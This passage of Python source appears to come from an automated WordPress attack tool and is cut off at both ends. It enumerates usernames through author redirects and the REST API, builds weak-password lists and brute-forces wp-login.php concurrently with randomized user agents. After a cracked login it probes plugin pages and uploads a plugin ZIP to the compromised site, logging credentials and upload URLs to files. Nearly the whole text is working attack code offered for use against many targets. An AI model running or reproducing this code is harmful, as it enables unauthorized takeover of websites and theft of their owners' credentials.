    return upload_methods_tested, successful_uploads

def test_plugin_upload(url, login_path, username, password, timeout, upload_output_file):
    """Test plugin upload capabilities using multiple methods"""
    session = requests.Session()
    login_url = f"{url}{login_path}"
    upload_methods_tested = []
    successful_uploads = []

    # Get WordPress base path for correct URL construction
    wp_base_path = get_wp_base_path(login_path)

    try:
        # Get login page first to set cookies
        headers = {'User-Agent': get_random_user_agent()}
        session.get(login_url, timeout=timeout, verify=False, headers=headers)

        # Prepare login data
        login_data = {
            'log': username.strip(),
            'pwd': password,
            'wp-submit': 'Log In',
            'testcookie': '1'
        }

        # Attempt login
        headers = {
            'User-Agent': get_random_user_agent(),
            'Cookie': 'wordpress_test_cookie=WP Cookie check',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Referer': login_url
        }

        response = session.post(login_url, data=login_data, headers=headers,
                             allow_redirects=True, timeout=timeout, verify=False)

        # Check if login was successful
        if wp_base_path + '/wp-admin/' not in response.url and '/wp-admin/' not in response.url:
            return upload_methods_tested, successful_uploads

        # Method 1: Direct plugin upload via admin interface
        upload_url = f"{url}{wp_base_path}/wp-admin/plugin-install.php?tab=upload"
        try:
            upload_page = session.get(upload_url, timeout=timeout, verify=False)
            if upload_page.status_code == 200:
                # Look for nonce in the upload form
                nonce_match = re.search(r'name="_wpnonce"\s+value="([^"]+)"', upload_page.text)
                if nonce_match:
                    nonce = nonce_match.group(1)
                    
                    # Create the plugin ZIP
                    plugin_zip = create_test_plugin_zip()
                    
                    # Prepare multipart form data
                    files = {
                        'pluginzip': ('kishore.zip', plugin_zip, 'application/zip')
                    }
                    
                    form_data = {
                        '_wpnonce': nonce,
                        '_wp_http_referer': f'{wp_base_path}/wp-admin/plugin-install.php?tab=upload',
                        'install-plugin-submit': 'Install Now'
                    }
                    
                    # Upload the plugin using correct WordPress path
                    upload_endpoint = f"{url}{wp_base_path}/wp-admin/update.php?action=upload-plugin"
                    upload_response = session.post(
                        upload_endpoint,
                        data=form_data,
                        files=files,
                        timeout=timeout,
                        verify=False
                    )
                    
                    upload_methods_tested.append("Direct Admin Upload")
                    
                    if upload_response.status_code == 200:
                        if 'Plugin installed successfully' in upload_response.text or 'successfully' in upload_response.text.lower():
                            # Test if the plugin file is accessible
                            test_url = f"{url}{wp_base_path}/wp-content/plugins/kishore/hello.php"
                            test_response = session.get(test_url, timeout=timeout, verify=False)
                            if test_response.status_code == 200 and 'kishoriya' in test_response.text:
                                successful_uploads.append(("Direct Admin Upload", test_url))
                                print_status(f"🎉 PLUGIN UPLOAD SUCCESS: {url} - {username}:{password} - Direct Admin Upload - {test_url}", "success")
                                write_plugin_upload_success(upload_output_file, url, username, password, "Direct Admin Upload", test_url)
        except Exception:
            upload_methods_tested.append("Direct Admin Upload (Failed)")

    except Exception as e:
        print_status(f"Error during plugin upload test: {str(e)}", "error")

    return upload_methods_tested, successful_uploads

async def async_find_working_login_path(url, timeout, session):
    """Find a working login path using asyncio for faster checking"""
    print_status(f"Finding working login path for {url}")
    tasks = []
    login_results = {}
    
    # Start with most common path first for optimization
    for path in LOGIN_PATHS:
        login_url = f"{url}{path}"
        headers = {'User-Agent': get_random_user_agent()}
        
        # Create task for each path
        task = asyncio.create_task(check_login_path(login_url, path, headers, timeout, session))
        tasks.append(task)
    
    # Wait for all tasks to complete
    completed_paths = await asyncio.gather(*tasks, return_exceptions=True)
    
    # Process results
    for path, is_valid in zip(LOGIN_PATHS, completed_paths):
        if isinstance(is_valid, Exception):
            continue
        if is_valid:
            print_status(f"Found working login path: {path} for {url}", "success")
            return path
    
    # Double-check the default path with lenient detection
    default_path = '/wp-login.php'
    login_url = f"{url}{default_path}"
    headers = {'User-Agent': get_random_user_agent()}
    
    try:
        async with session.get(login_url, timeout=timeout, ssl=False, headers=headers, allow_redirects=True) as response:
            if response.status == 200:
                text = await response.text()
                if '<form' in text and 'password' in text.lower():
                    print_status(f"Found default login path with lenient detection: {default_path} for {url}", "success")
                    return default_path
    except Exception:
        pass
    
    print_status(f"No working login path found for {url}", "error")
    return None

async def check_login_path(login_url, path, headers, timeout, session):
    """Check if a login path is valid using asyncio"""
    try:
        async with session.get(login_url, timeout=timeout, ssl=False, headers=headers, allow_redirects=True) as response:
            if response.status == 200:
                text = await response.text()
                return WP_LOGIN_INDICATORS.search(text) is not None
    except Exception:
        pass
    return False

def find_working_login_path(url, timeout):
    """Find a working login path from the predefined list of paths using requests"""
    print_status(f"Finding working login path for {url}")
    
    # Try most common path first (optimization)
    for path in LOGIN_PATHS:
        try:
            login_url = f"{url}{path}"
            headers = {'User-Agent': get_random_user_agent()}
            response = requests.get(login_url, timeout=timeout, verify=False, headers=headers, allow_redirects=True)
            
            # More efficient check for WordPress login page using compiled regex
            if response.status_code == 200 and WP_LOGIN_INDICATORS.search(response.text):
                print_status(f"Found working login path: {path} for {url}", "success")
                return path
        except requests.RequestException:
            continue
    
    # Double-check the default wp-login.php path with a more lenient detection
    try:
        default_path = '/wp-login.php'
        login_url = f"{url}{default_path}"
        headers = {'User-Agent': get_random_user_agent()}
        response = requests.get(login_url, timeout=timeout, verify=False, headers=headers, allow_redirects=True)
        
        # If status code is 200 and it has a form, it's likely a login page
        if response.status_code == 200 and '<form' in response.text and 'password' in response.text.lower():
            print_status(f"Found default login path with lenient detection: {default_path} for {url}", "success")
            return default_path
    except requests.RequestException:
        pass
    
    print_status(f"No working login path found for {url}", "error")
    return None

async def async_enum_from_author_param(url, timeout, session, delay=0):
    """Enumerate users from /?author=X parameter using asyncio"""
    users = set()
    tasks = []

    # Try author parameter for several users in parallel
    for i in range(1, 10):  # Increased range for better discovery
        author_url = f"{url}/?author={i}"
        headers = {'User-Agent': get_random_user_agent()}
        task = asyncio.create_task(check_author_param(author_url, headers, timeout, session))
        tasks.append(task)
        
        # Add delay if specified
        if delay > 0:
            await asyncio.sleep(delay)

    # Wait for all tasks to complete
    results = await asyncio.gather(*tasks, return_exceptions=True)
    
    # Process results
    for result in results:
        if isinstance(result, Exception) or not result:
            continue
        users.update(result)

    return users

async def check_author_param(author_url, headers, timeout, session):
    """Check a single author parameter using asyncio"""
    found_users = set()
    
    try:
        # Check for redirect to author page
        async with session.get(author_url, allow_redirects=False, timeout=timeout, ssl=False, headers=headers) as response:
            if response.status in (301, 302) and 'location' in response.headers:
                location = response.headers['location']
                matches = AUTHOR_PATTERN.search(location)
                if matches:
                    username = matches.group(1)
                    found_users.add(username)
        
        # Check for author info in body
        async with session.get(author_url, timeout=timeout, ssl=False, headers=headers) as body_response:
            if body_response.status == 200:
                body_text = await body_response.text()
                for pattern in AUTHOR_BODY_PATTERNS:
                    matches = pattern.findall(body_text)
                    found_users.update(matches)
    
    except Exception:
        pass
        
    return found_users

def enum_from_author_param(url, timeout, delay=0):
    """Enumerate users from /?author=X parameter"""
    users = set()

    # Try author parameter for more users to improve discovery
    for i in range(1, 10):  # Increased range
        try:
            author_url = f"{url}/?author={i}"
            headers = {'User-Agent': get_random_user_agent()}

            response = requests.get(author_url, allow_redirects=False, timeout=timeout, verify=False, headers=headers)

            # Check for redirect to author page
            if response.status_code in (301, 302) and 'location' in response.headers:
                location = response.headers['location']
                matches = AUTHOR_PATTERN.search(location)
                if matches:
                    username = matches.group(1)
                    users.add(username)
                    print_status(f"Found username via redirect: {username} on {url}", "success")

            # Add delay if specified
            if delay > 0:
                time.sleep(delay)

            # Check for author info in body
            headers = {'User-Agent': get_random_user_agent()}
            body_response = requests.get(author_url, timeout=timeout, verify=False, headers=headers)
            if body_response.status_code == 200:
                for pattern in AUTHOR_BODY_PATTERNS:
                    matches = pattern.findall(body_response.text)
                    for username in matches:
                        users.add(username)
                        print_status(f"Found username in body: {username} on {url}", "success")

            # Add delay if specified
            if delay > 0:
                time.sleep(delay)

        except requests.RequestException:
            continue

    return users

async def async_enum_from_rest_api(url, timeout, session):
    """Enumerate users from WP REST API using asyncio"""
    users = set()

    try:
        api_url = f"{url}/wp-json/wp/v2/users"
        headers = {'User-Agent': get_random_user_agent()}

        async with session.get(api_url, timeout=timeout, ssl=False, headers=headers) as response:
            if response.status == 200:
                try:
                    data = await response.json()
                    if isinstance(data, list):
                        for user in data:
                            if 'slug' in user:
                                username = user['slug']
                                users.add(username)
                            if 'username' in user:
                                username = user['username']
                                users.add(username)
                except ValueError:
                    pass  # Not valid JSON

    except Exception:
        pass

    return users

def enum_from_rest_api(url, timeout, delay=0):
    """Enumerate users from WP REST API"""
    users = set()

    try:
        api_url = f"{url}/wp-json/wp/v2/users"
        headers = {'User-Agent': get_random_user_agent()}

        response = requests.get(api_url, timeout=timeout, verify=False, headers=headers)

        if response.status_code == 200:
            try:
                data = response.json()
                if isinstance(data, list):
                    for user in data:
                        if 'slug' in user:
                            username = user['slug']
                            users.add(username)
                            print_status(f"Found username via REST API: {username} on {url}", "success")
                        if 'username' in user:
                            username = user['username']
                            users.add(username)
                            print_status(f"Found username via REST API: {username} on {url}", "success")
            except ValueError:
                pass  # Not valid JSON

    except requests.RequestException:
        pass

    return users

async def async_enumerate_usernames(url, timeout, session, delay=0, common_users=None):
    """Enumerate WordPress usernames using various methods with asyncio"""
    print_status(f"Enumerating usernames from {url}")

    tasks = [
        async_enum_from_author_param(url, timeout, session, delay),
        async_enum_from_rest_api(url, timeout, session)
    ]
    
    # Wait for all tasks to complete
    results = await asyncio.gather(*tasks, return_exceptions=True)
    
    # Process results
    users = set()
    for result in results:
        if isinstance(result, Exception) or not result:
            continue
        users.update(result)
    
    # Add common users if provided
    if common_users:
        users.update(common_users)
        print_status(f"Added {len(common_users)} common usernames to the list", "info")

    # Always add 'admin' as it's the most common username
    users.add('admin')
    
    # Add the domain name as potential username (common practice)
    domain = urlparse(url).netloc.split('.')[0]
    if domain and len(domain) > 2:  # Only add if reasonably long
        users.add(domain)

    if not users:
        print_status(f"No usernames found on {url}", "warning")
    else:
        print_status(f"Found {len(users)} unique username(s) on {url}: {', '.join(users)}", "info")

    return users

def enumerate_usernames(url, timeout, delay=0, common_users=None):
    """Enumerate WordPress usernames using various methods"""
    print_status(f"Enumerating usernames from {url}")

    users = set()
    users.update(enum_from_author_param(url, timeout, delay))
    users.update(enum_from_rest_api(url, timeout, delay))

    # Add common users if provided
    if common_users:
        users.update(common_users)
        print_status(f"Added {len(common_users)} common usernames to the list", "info")

    # Always add 'admin' as it's the most common username
    users.add('admin')
    
    # Add the domain name as potential username (common practice)
    domain = urlparse(url).netloc.split('.')[0]
    if domain and len(domain) > 2:  # Only add if reasonably long
        users.add(domain)

    if not users:
        print_status(f"No usernames found on {url}", "warning")
    else:
        print_status(f"Found {len(users)} unique username(s) on {url}: {', '.join(users)}", "info")

    return users

def get_password_list(username, common_passwords=None):
    """Generate password list for a given username"""
    common_suffixes = ['123', '123456', 'admin123', 'admin12345', 'password123', 'admin888', '12345678', '!', '@', '1234', 'P@ssw0rd']
    default_passwords = ['admin123', 'admin12345', 'password123', 'admin888', '123456', '12345678', 'admin', 'password', 'P@ssw0rd', 'admin2023', 'admin2024', 'admin2025', 'Ab123456', 'Qq123456', 'Aa123456', 'Avfr4bgt5', 'Admin888', 'Admin123', 'Passw0rd', 'Change123']
    
    # Start with provided common passwords
    passwords = []
    if common_passwords:
        passwords.extend(common_passwords[:50])  # Limit to top 50 for performance
    
    # Add username-based passwords
    passwords.append(username)  # The username itself
    passwords.extend([username + suffix for suffix in common_suffixes])
    
    # Add default passwords
    passwords.extend(default_passwords)
    
    # Add common variations of the username
    if username != username.lower():
        passwords.append(username.lower())
    if username != username.upper():
        passwords.append(username.upper())
    if username != username.capitalize():
        passwords.append(username.capitalize())
    
    # Remove duplicates while maintaining order
    seen = set()
    unique_passwords = []
    for password in passwords:
        if password not in seen:
            seen.add(password)
            unique_passwords.append(password)
    
    return unique_passwords

async def async_try_login(url, login_path, username, password, timeout, session):
    """Attempt to login to WordPress with given credentials using asyncio"""
    login_url = f"{url}{login_path}"
    cookies = {'wordpress_test_cookie': 'WP Cookie check'}
    headers = {
        'User-Agent': get_random_user_agent(),
        'Content-Type': 'application/x-www-form-urlencoded',
        'Referer': login_url
    }
    
    # Prepare login data
    login_data = {
        'log': username.strip(),
        'pwd': password,
        'wp-submit': 'Log In',
        'testcookie': '1'
    }

    try:
        # Try to log in
        async with session.post(login_url, data=login_data, headers=headers, cookies=cookies,
                             allow_redirects=True, timeout=timeout, ssl=False) as response:
            
            # Check for failed login indicators
            content = await response.text()
            content_lower = content.lower()
            
            # Check for explicit login failure messages
            failure_indicators = [
                'incorrect username or password',
                'invalid username', 
                'invalid password',
                'error: the username',
                'is not registered',
                'authentication failed',
                'login failed',
                'wp-login.php'
            ]
            
            if any(indicator in content_lower for indicator in failure_indicators):
                return False
                
            # Check for successful login indicators
            success_indicators = [
                'dashboard', 'wp-admin-bar', 'adminmenu', 
                'wp-admin/index.php', 'wp-admin/profile.php'
            ]
            
            if any(indicator in content_lower for indicator in success_indicators):
                # Additional verification - check plugin installation access
                has_access, plugin_url, details = await verify_plugin_installation_access(session, url, timeout)
                return has_access
                
            # Check cookies as fallback
            cookie_header = response.headers.get('Set-Cookie', '')
            if 'wordpress_logged_in' in cookie_header:
                # Verify plugin installation access even with cookies
                has_access, plugin_url, details = await verify_plugin_installation_access(session, url, timeout)
                return has_access
                
    except Exception:
        pass
        
    return False

def try_login(url, login_path, username, password, timeout, delay=0):
    """Attempt to login to WordPress with given credentials"""
    session = requests.Session()
    login_url = f"{url}{login_path}"

    try:
        # Get login page first to set cookies
        headers = {'User-Agent': get_random_user_agent()}
        session.get(login_url, timeout=timeout, verify=False, headers=headers)

        if delay > 0:
            time.sleep(delay)

        # Prepare login data
        login_data = {
            'log': username.strip(),
            'pwd': password,
            'wp-submit': 'Log In',
            'testcookie': '1'
        }

        # Attempt login
        headers = {
            'User-Agent': get_random_user_agent(),
            'Cookie': 'wordpress_test_cookie=WP Cookie check',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Referer': login_url
        }

        response = session.post(login_url, data=login_data, headers=headers,
                              allow_redirects=True, timeout=timeout, verify=False)

        # Check for failed login indicators
        content = response.text.lower()
        
        # Check for explicit login failure messages
        failure_indicators = [
            'incorrect username or password',
            'invalid username', 
            'invalid password',
            'error: the username',
            'is not registered',
            'authentication failed',
            'login failed',
            'wp-login.php'
        ]
        
        if any(indicator in content for indicator in failure_indicators):
            return False
            
        # Check for successful login indicators
        success_indicators = [
            'dashboard', 'wp-admin-bar', 'adminmenu', 
            'wp-admin/index.php', 'wp-admin/profile.php'
        ]
        
        if any(indicator in content for indicator in success_indicators):
            # Additional verification - check plugin installation access
            has_access, plugin_url, details = verify_plugin_installation_access_sync(session, url, timeout)
            return has_access
            
        # Check cookies as fallback
        cookie_header = response.headers.get('Set-Cookie', '')
        if 'wordpress_logged_in' in cookie_header or any(cookie.name.startswith('wordpress_logged_in') for cookie in session.cookies):
            # Verify plugin installation access even with cookies
            has_access, plugin_url, details = verify_plugin_installation_access_sync(session, url, timeout)
            return has_access

        return False

    except requests.RequestException:
        return False

async def async_check_plugin_access(url, login_path, username, password, timeout, session):
    """Check if the credentials have access to plugins page or wp-plugin.php using asyncio"""
    login_url = f"{url}{login_path}"
    plugin_urls = [
        f"{url}/wp-admin/plugins.php",
        f"{url}/wp-admin/plugin-install.php",
        f"{url}/wp-admin/plugin-editor.php"
    ]
    
    # Create a new session for this check
    cookies = {'wordpress_test_cookie': 'WP Cookie check'}
    headers = {
        'User-Agent': get_random_user_agent(),
        'Content-Type': 'application/x-www-form-urlencoded',
        'Referer': login_url
    }
    
    # Prepare login data
    login_data = {
        'log': username.strip(),
        'pwd': password,
        'wp-submit': 'Log In',
        'testcookie': '1'
    }

    try:
        # Log in first
        async with session.post(login_url, data=login_data, headers=headers, cookies=cookies,
                             allow_redirects=True, timeout=timeout, ssl=False) as response:
            if '/wp-admin/' in str(response.url):
                # We're logged in, check plugin access
                plugin_tasks = []
                for plugin_url in plugin_urls:
                    task = asyncio.create_task(check_plugin_url(plugin_url, session, timeout))
                    plugin_tasks.append(task)
                
                # Wait for all plugin checks to complete
                plugin_results = await asyncio.gather(*plugin_tasks, return_exceptions=True)
                
                # Process results
                accessible_plugins = []
                for i, (plugin_url, result) in enumerate(zip(plugin_urls, plugin_results)):
                    if isinstance(result, Exception) or not result:
                        continue
                    
                    plugin_name = plugin_url.split('/')[-1]
                    accessible_plugins.append(plugin_name)
                
                return accessible_plugins
    except Exception:
        pass
        
    return []

async def check_plugin_url(plugin_url, session, timeout):
    """Check if a plugin URL is accessible using asyncio"""
    try:
        headers = {'User-Agent': get_random_user_agent()}
        async with session.get(plugin_url, timeout=timeout, ssl=False, headers=headers) as response:
            if response.status == 200 and 'wp-login.php' not in str(response.url):
                text = await response.text()
                
                # Verify it's actually the plugins page
                if 'plugins.php' in plugin_url and ('add_new' in text or 'plugin-title' in text):
                    return True
                elif 'plugin-install.php' in plugin_url and ('plugin-install-tab' in text or 'upload-plugin' in text):
                    return True
                elif 'plugin-editor.php' in plugin_url and ('theme-editor-textarea' in text or 'plugin-editor' in text):
                    return True
    except Exception:
        pass
        
    return False

def check_plugin_access(url, login_path, username, password, timeout):
    """Check if the credentials have access to plugins page or wp-plugin.php"""
    session = requests.Session()
    login_url = f"{url}{login_path}"
    plugin_urls = [
        f"{url}/wp-admin/plugins.php",
        f"{url}/wp-admin/plugin-install.php",
        f"{url}/wp-admin/plugin-editor.php"
    ]

    try:
        # Get login page first to set cookies
        headers = {'User-Agent': get_random_user_agent()}
        session.get(login_url, timeout=timeout, verify=False, headers=headers)

        # Prepare login data
        login_data = {
            'log': username.strip(),
            'pwd': password,
            'wp-submit': 'Log In',
            'testcookie': '1'
        }

        # Attempt login
        headers = {
            'User-Agent': get_random_user_agent(),
            'Cookie': 'wordpress_test_cookie=WP Cookie check',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Referer': login_url
        }

        response = session.post(login_url, data=login_data, headers=headers,
                             allow_redirects=True, timeout=timeout, verify=False)

        # Check if login was successful
        if '/wp-admin/' in response.url:
            accessible_plugins = []

            # Check each plugin URL for access
            for plugin_url in plugin_urls:
                try:
                    plugin_response = session.get(plugin_url, timeout=timeout, verify=False,
                                              headers={'User-Agent': get_random_user_agent()})

                    # Check if we have access (HTTP 200 and not redirected to login)
                    if plugin_response.status_code == 200 and 'wp-login.php' not in plugin_response.url:
                        # Verify it's actually the plugins page by checking content
                        if 'plugins.php' in plugin_url and ('add_new' in plugin_response.text or 'plugin-title' in plugin_response.text):
                            accessible_plugins.append('plugins.php')
                        elif 'plugin-install.php' in plugin_url and ('plugin-install-tab' in plugin_response.text or 'upload-plugin' in plugin_response.text):
                            accessible_plugins.append('plugin-install.php')
                        elif 'plugin-editor.php' in plugin_url and ('theme-editor-textarea' in plugin_response.text or 'plugin-editor' in plugin_response.text):
                            accessible_plugins.append('plugin-editor.php')

                except requests.RequestException:
                    continue

            return accessible_plugins

        return []

    except requests.RequestException:
        return []

def write_success(output_file, url, username, password):
    """Write successful login to file with timestamp"""
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    with open(output_file, 'a') as f:
        f.write(f"[{timestamp}] {url} - {username}:{password}\n")

def write_plugin_access(output_file, url, username, password, accessible_plugins):
    """Write plugin access information to file with timestamp"""
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    with open(output_file, 'a') as f:
        plugins_str = ', '.join(accessible_plugins) if accessible_plugins else "No plugin access"
        f.write(f"[{timestamp}] {url} - {username}:{password} - Plugin Access: {plugins_str}\n")

def save_state(state_file, targets_completed, targets_to_process, current_usernames=None, current_url=None):
    """Save the current state to a file for resuming later"""
    state = {
        'targets_completed': list(targets_completed),
        'targets_to_process': list(targets_to_process),
        'current_url': current_url,
        'current_usernames': list(current_usernames) if current_usernames else None,
        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    }
    
    with open(state_file, 'w') as f:
        json.dump(state, f)
    
    print_status(f"State saved to {state_file}", "info")

def load_state(state_file):
    """Load the state from a file for resuming"""
    try:
        with open(state_file, 'r') as f:
            state = json.load(f)
        
        print_status(f"Loaded state from {state_file} (saved at {state.get('timestamp', 'unknown')})", "info")
        
        # Initialize with defaults for any missing fields
        result = {
            'targets_completed': set(state.get('targets_completed', [])),
            'targets_to_process': list(state.get('targets_to_process', [])),
            'current_url': state.get('current_url'),
            'current_usernames': set(state.get('current_usernames', [])) if state.get('current_usernames') else None
        }
        return result
    except (FileNotFoundError, json.JSONDecodeError) as e:
        print_status(f"No valid state file found at {state_file}: {str(e)}", "warning")
        return {
            'targets_completed': set(),
            'targets_to_process': [],
            'current_url': None,
            'current_usernames': None
        }
    except Exception as e:
        print_status(f"Error loading state file: {str(e)}", "error")
        print_status(f"Starting with fresh state", "info")
        return {
            'targets_completed': set(),
            'targets_to_process': [],
            'current_url': None,
            'current_usernames': None
        }

async def async_brute_force_users(url, login_path, usernames, timeout, workers, verbose, output_file, 
                                  delay=0, state_file=None, max_attempts=50, common_passwords=None):
    """Brute force WordPress login for the enumerated usernames using asyncio"""
    if not usernames:
        return []

    print_status(f"Starting brute force against {len(usernames)} username(s) on {url} with {workers} workers")

    successful_logins = []
    total_attempts = 0
    
    # Create a connection pool for better performance
    connector = aiohttp.TCPConnector(limit=workers, ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        # Save state before starting brute force
        if state_file:
            save_state(state_file, set(), [], usernames, url)

        # Process each username
        for username in usernames:
            # Skip if we already found credentials for this username
            if username in [login.split(':')[0] for login in successful_logins]:
                continue
                
            passwords = get_password_list(username, common_passwords)
            actual_passwords = passwords[:max_attempts]  # Limit attempts per username
            print_status(f"Trying {len(actual_passwords)} passwords for username '{username}' on {url}")
            
            # Create a queue of tasks for this username
            login_tasks = []
            for password in actual_passwords:
                task = asyncio.create_task(
                    async_try_login(url, login_path, username, password, timeout, session)
                )
                login_tasks.append((task, password))
                
                # Add delay if specified
                if delay > 0:
                    await asyncio.sleep(delay)
                    
            # Process login attempts for this username
            for task, password in login_tasks:
                total_attempts += 1
                
                try:
                    result = await task
                    if result:
                        credential = f"{username}:{password}"
                        successful_logins.append(credential)
                        print_status(f"✓ SUCCESS: {url} - {credential}", "success")

                        # Check for plugin access
                        print_status(f"Checking plugin access for {url} - {credential}", "info")
                        plugin_task = asyncio.create_task(
                            async_check_plugin_access(url, login_path, username, password, timeout, session)
                        )
                        accessible_plugins = await plugin_task

                        if accessible_plugins:
                            print_status(f"🔌 PLUGIN ACCESS: {url} - {credential} - Access to: {', '.join(accessible_plugins)}", "success")
                            
                            # Test plugin upload if we have plugin access  
                            print_status(f"Testing plugin upload for {url} - {credential}", "info")
                            upload_task = asyncio.create_task(
                                async_test_plugin_upload(url, login_path, username, password, timeout, session, output_file.replace('.txt', '_uploads.txt'))
                            )
                            upload_methods, successful_uploads = await upload_task
                            
                            if successful_uploads:
                                print_status(f"🎉 PLUGIN UPLOAD SUCCESS: {url} - {credential} - Methods: {', '.join([method for method, _ in successful_uploads])}", "success")
                            else:
                                print_status(f"❌ PLUGIN UPLOAD FAILED: {url} - {credential} - Tried: {', '.join(upload_methods)}", "warning")
                        else:
                            print_status(f"🔌 NO PLUGIN ACCESS: {url} - {credential}", "warning")

                        # Write to file immediately
                        write_success(output_file, url, username, password)
                        write_plugin_access(output_file, url, username, password, accessible_plugins)
                        
                        # Cancel remaining tasks for this username
                        for remaining_task, _ in login_tasks:
                            if not remaining_task.done():
                                remaining_task.cancel()
                                
                        # Break the loop for this username
                        break
                    elif verbose:
                        print_status(f"✗ Failed: {url} - {username}:{password}", "warning")
                except asyncio.CancelledError:
                    # Task was cancelled, just continue
                    pass
                except Exception as e:
                    if verbose:
                        print_status(f"Error trying {url} - {username}:{password}: {str(e)}", "error")
                    
                # Periodically update state (e.g., after each 10 attempts)
                if state_file and total_attempts % 10 == 0:
                    remaining_usernames = set([u for u in usernames if u not in [login.split(':')[0] for login in successful_logins]])
                    save_state(state_file, set(), [], remaining_usernames, url)
    
    print_status(f"Brute force completed on {url}. {total_attempts} attempts. {len(successful_logins)} successful logins.", "info")
    return successful_logins

def brute_force_users(url, login_path, usernames, timeout, workers, verbose, output_file, delay=0, 
                      state_file=None, max_attempts=50, common_passwords=None):
    """Brute force WordPress login for the enumerated usernames"""
    if not usernames:
        return []

    print_status(f"Starting brute force against {len(usernames)} username(s) on {url} with {workers} workers")

    successful_logins = []
    total_attempts = 0
    
    # Save state before starting brute force
    if state_file:
        save_state(state_file, set(), [], usernames, url)

    # Process one username at a time to avoid wasting resources
    for username in usernames:
        # Skip if we already found credentials for this username
        if username in [login.split(':')[0] for login in successful_logins]:
            continue
            
        passwords = get_password_list(username, common_passwords)
        actual_passwords = passwords[:max_attempts]  # Limit attempts per username
        print_status(f"Trying {len(actual_passwords)} passwords for username '{username}' on {url}")
        
        # Create futures for this username's password attempts
        with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as executor:
            futures = {}
            for password in actual_passwords:
                future = executor.submit(try_login, url, login_path, username, password, timeout, delay)
                futures[future] = password
                
            # Process futures as they complete
            for future in concurrent.futures.as_completed(futures):
                password = futures[future]
                total_attempts += 1
                
                try:
                    result = future.result()
                    if result:
                        credential = f"{username}:{password}"
                        successful_logins.append(credential)
                        print_status(f"✓ SUCCESS: {url} - {credential}", "success")

                        # Check for plugin access
                        print_status(f"Checking plugin access for {url} - {credential}", "info")
                        accessible_plugins = check_plugin_access(url, login_path, username, password, timeout)

                        if accessible_plugins:
                            print_status(f"🔌 PLUGIN ACCESS: {url} - {credential} - Access to: {', '.join(accessible_plugins)}", "success")
                            
                            # Test plugin upload if we have plugin access
                            print_status(f"Testing plugin upload for {url} - {credential}", "info")
                            upload_methods, successful_uploads = test_plugin_upload(
                                url, login_path, username, password, timeout, output_file.replace('.txt', '_uploads.txt')
                            )
                            
                            if successful_uploads:
                                print_status(f"🎉 PLUGIN UPLOAD SUCCESS: {url} - {credential} - Methods: {', '.join([method for method, _ in successful_uploads])}", "success")
                            else:
                                print_status(f"❌ PLUGIN UPLOAD FAILED: {url} - {credential} - Tried: {', '.join(upload_methods)}", "warning")
                        else:
                            print_status(f"🔌 NO PLUGIN ACCESS: {url} - {credential}", "warning")

                        # Write to file immediately
                        write_success(output_file, url, username, password)
                        write_plugin_access(output_file, url, username, password, accessible_plugins)
                        
                        # Cancel remaining futures for this username
                        for f in futures:
                            if not f.done():
                                f.cancel()
                                
                        # Break the loop for this username
                        break
                    elif verbose:
                        print_status(f"✗ Failed: {url} - {username}:{password}", "warning")
                except Exception as e:
                    if verbose:
                        print_status(f"Error trying {url} - {username}:{password}: {str(e)}", "error")
                
                # Periodically update state
                if state_file and total_attempts % 10 == 0:
                    remaining_usernames = set([u for u in usernames if u not in [login.split(':')[0] for login in successful_logins]])
                    save_state(state_file, set(), [], remaining_usernames, url)

    print_status(f"Brute force completed on {url}. {total_attempts} attempts. {len(successful_logins)} successful logins.", "info")
    return successful_logins

def load_common_users(filename):
    """Load common usernames from a file"""
    try:
        with open(filename, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    except Exception as e:
        print_status(f"Error loading common users file: {str(e)}", "error")
        return []

def load_common_passwords(filename):
    """Load common passwords from a file"""
    try:
        with open(filename, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    except Exception as e:
        print_status(f"Error loading common passwords file: {str(e)}", "error")
        return []

async def async_process_single_site(url, args, targets_completed=None):
    """Process a single WordPress site using asyncio"""
    if targets_completed is None:
        targets_completed = set()
        
    normalized_url = normalize_url(url)
    
    # Skip if already completed
    if normalized_url in targets_completed:
        print_status(f"Skipping {normalized_url} - already processed", "info")
        return []

    try:
        # Load common users and passwords if specified
        common_users = load_common_users(args.common_users) if args.common_users else None
        common_passwords = load_common_passwords(args.common_passwords) if args.common_passwords else None
        
        # Create connection pool for better performance
        connector = aiohttp.TCPConnector(limit=args.workers, ssl=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            # Find a working login path
            login_path = await async_find_working_login_path(normalized_url, args.timeout, session)
            if not login_path:
                # Allow manual path override if detection fails
                print_status(f"No login path automatically detected for {normalized_url}.", "warning")
                print_status(f"Trying default /wp-login.php path anyway...", "info")
                login_path = "/wp-login.php"  # Use default path as fallback

            usernames = await async_enumerate_usernames(normalized_url, args.timeout, session, args.delay, common_users)

            if not usernames:
                print_status(f"No usernames found to brute force on {normalized_url}. Skipping.", "warning")
                targets_completed.add(normalized_url)
                if args.state_file:
                    save_state(args.state_file, targets_completed, [], None, None)
                return []

            if args.only_enumerate:
                print_status(f"Username enumeration completed for {normalized_url}. Skipping brute force as requested.", "info")
                targets_completed.add(normalized_url)
                if args.state_file:
                    save_state(args.state_file, targets_completed, [], None, None)
                return []

            results = await async_brute_force_users(
                normalized_url, login_path, usernames, args.timeout, args.workers, 
                args.verbose, args.output, args.delay, 
                args.state_file if args.resume else None,
                args.max_login_attempts, common_passwords
            )
            targets_completed.add(normalized_url)
            
            # Update state after completion
            if args.state_file:
                save_state(args.state_file, targets_completed, [], None, None)
                
            return results

    except Exception as e:
        print_status(f"Error processing {normalized_url}: {str(e)}", "error")
        if args.verbose:
            import traceback
            traceback.print_exc()
        
        # Wait after failure to avoid rate limiting
        print_status(f"Waiting {args.fail_timeout} seconds before continuing...", "warning")
        await asyncio.sleep(args.fail_timeout)
        
        return []

def process_single_site(url, args, targets_completed=None):
    """Process a single WordPress site"""
    if targets_completed is None:
        targets_completed = set()
        
    normalized_url = normalize_url(url)
    
    # Skip if already completed
    if normalized_url in targets_completed:
        print_status(f"Skipping {normalized_url} - already processed", "info")
        return []

    try:
        # Load common users and passwords if specified
        common_users = load_common_users(args.common_users) if args.common_users else None
        common_passwords = load_common_passwords(args.common_passwords) if args.common_passwords else None
        
        # Find a working login path
